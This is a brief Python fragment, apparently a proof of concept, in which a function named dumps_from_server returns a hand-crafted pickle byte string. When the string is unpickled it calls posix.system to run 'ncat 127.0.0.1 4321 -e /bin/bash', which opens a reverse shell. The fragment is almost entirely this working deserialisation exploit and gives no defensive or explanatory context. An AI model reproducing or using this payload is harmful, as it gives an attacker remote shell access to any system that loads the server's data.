...
def dumps_from_server(
    ...
    print("DUMPS FROM SERVER CALLED!!!")
    return b"\x80\x05\x95;\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c ncat 127.0.0.1 4321 -e /bin/bash\x94\x85\x94R\x94."
